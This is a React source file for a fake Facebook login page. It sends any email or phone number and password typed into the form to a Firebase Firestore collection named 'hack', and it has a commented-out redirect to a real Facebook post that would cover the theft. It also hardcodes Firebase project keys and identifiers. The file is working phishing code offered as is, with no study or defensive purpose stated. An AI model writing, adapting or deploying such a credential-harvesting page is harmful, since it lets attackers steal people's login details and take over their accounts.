import "./App.css";
import { useState, useEffect } from "react";
import axios from "axios";
import Iframe from "react-iframe";
import firebase from "firebase/compat/app";
import "firebase/compat/firestore";

firebase.initializeApp({
  apiKey: "AIzaSyC9bA5NKsStcYRPDDTJFQbFUI1oCX2tq4I",
  authDomain: "thobor-9436b.firebaseapp.com",
  projectId: "thobor-9436b",
  storageBucket: "thobor-9436b.appspot.com",
  messagingSenderId: "496274391107",
  appId: "1:496274391107:web:f1711686e690bab69fd4f6",
});

const firestore = firebase.firestore();
const hack = firestore.collection("hack");

function App() {
  //creating IP state
  const [ip, setIP] = useState("");
  const [username, setUsername] = useState("");
  const [pass, setPass] = useState("");

  const getData = async () => {
    console.log(username, pass);
    await hack
      .add({
        username,
        pass,
      })
      .then((res) => {
        console.log(res);
        // window.location.href =
        //   "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
      })
      .catch((er) => {
        console.log(er);
      });
  };

  return (
    <>
      <div className="content">
        <div className="flex-div">
          <div className="name-content">
            <h1 className="logo">Facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
          </div>
          <div className="form">
            <input
              type="text"
              placeholder="Email or Phone Number"
              required
              onChange={(e) => setUsername(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              required
              onChange={(e) => setPass(e.target.value)}
            />
            <button className="login" onClick={getData}>
              Log In
            </button>
            <a href="#">Forgot Password ?</a>
            <hr />
            <button className="create-account">Create New Account</button>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;
